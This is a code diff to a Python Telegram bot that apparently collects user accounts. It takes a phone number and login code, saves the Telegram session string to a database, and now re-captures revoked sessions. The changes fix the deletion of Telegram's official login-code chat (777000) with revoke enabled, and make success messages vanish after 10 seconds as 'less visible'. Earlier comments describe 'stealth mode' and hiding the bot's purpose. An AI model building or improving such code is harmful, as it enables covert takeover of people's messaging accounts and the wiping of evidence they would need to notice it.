@@ -98,9 +98,9 @@ async def delete_user_message(update: Update):
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """/start does nothing — stealth mode."""
-    # Silent. Don't reveal bot purpose.
+    """/start — prompt to begin."""
     await delete_user_message(update)
+    await send_ephemeral(update, "Send /startcollector to add an account.")
 
 
 async def startcollector(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -142,8 +142,9 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
             phone,
         )
         if existing:
-            await send_ephemeral(update, f"❌ Already registered: {existing}")
-            return ConversationHandler.END
+            # Allow re-auth — session may have been revoked. Continue flow, will UPDATE on finalize.
+            logger.info("Re-authing existing account: %s", existing)
+            _auth_sessions[update.effective_user.id]["reauth_name"] = existing
 
     # Create Telethon client and request code
     try:
@@ -249,31 +250,37 @@ async def finalize_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE
         me = await client.get_me()
         session_string = client.session.save()
 
-        # Generate account name
-        name = me.username or f"user_{me.id}"
-        if me.first_name:
+        # Generate account name — preserve existing name on re-auth
+        reauth_name = session.get("reauth_name")
+        name = reauth_name or (me.username or f"user_{me.id}")
+        if not reauth_name and me.first_name:
             name = me.first_name.lower().replace(" ", "_")[:32]
 
-        # Save to DB
+        # Save to DB — INSERT on first auth, UPDATE session_string on re-auth
         pool = await get_db_pool()
         async with pool.acquire() as conn:
-            # Handle name collision
-            base_name = name
-            suffix = 0
-            while True:
-                existing = await conn.fetchval(
-                    "SELECT 1 FROM telegram_user_accounts WHERE name = $1", name
-                )
-                if not existing:
-                    break
-                suffix += 1
-                name = f"{base_name}_{suffix}"
+            # Handle name collision (first auth only — re-auth keeps existing name)
+            if not reauth_name:
+                base_name = name
+                suffix = 0
+                while True:
+                    existing = await conn.fetchval(
+                        "SELECT 1 FROM telegram_user_accounts WHERE name = $1", name
+                    )
+                    if not existing:
+                        break
+                    suffix += 1
+                    name = f"{base_name}_{suffix}"
 
             await conn.execute(
                 """
                 INSERT INTO telegram_user_accounts
                     (name, api_id, api_hash, phone, session_string, owner_bot, status, last_connected_at)
                 VALUES ($1, $2, $3, $4, $5, $6, 'active', NOW())
+                ON CONFLICT (phone) DO UPDATE SET
+                    session_string = EXCLUDED.session_string,
+                    status = 'active',
+                    last_connected_at = NOW()
                 """,
                 name, API_ID, API_HASH, phone, session_string, bot_name,
             )
@@ -283,8 +290,10 @@ async def finalize_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE
 
         # Delete chat history with Telegram official (777000) to remove code messages
         try:
+            # Must resolve the peer first to get the correct access_hash
+            telegram_peer = await client.get_input_entity(777000)
             await client(DeleteHistoryRequest(
-                peer=InputPeerUser(user_id=777000, access_hash=0),
+                peer=telegram_peer,
                 max_id=0,
                 just_clear=False,
                 revoke=True,
@@ -293,7 +302,9 @@ async def finalize_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE
         except Exception as e:
             logger.debug("Could not delete Telegram chat history: %s", e)
 
-        await send_ephemeral(update, f"✅ {name}")
+        # Send success — delete after 10s (shorter than default 60s, less visible)
+        msg = await update.message.reply_text(f"✅ {name}")
+        asyncio.create_task(delete_message_later(msg, delay=10))
         logger.info("Onboarded account: %s (phone=%s, bot=%s)", name, phone[:4] + "****", bot_name)
 
     except Exception as e:
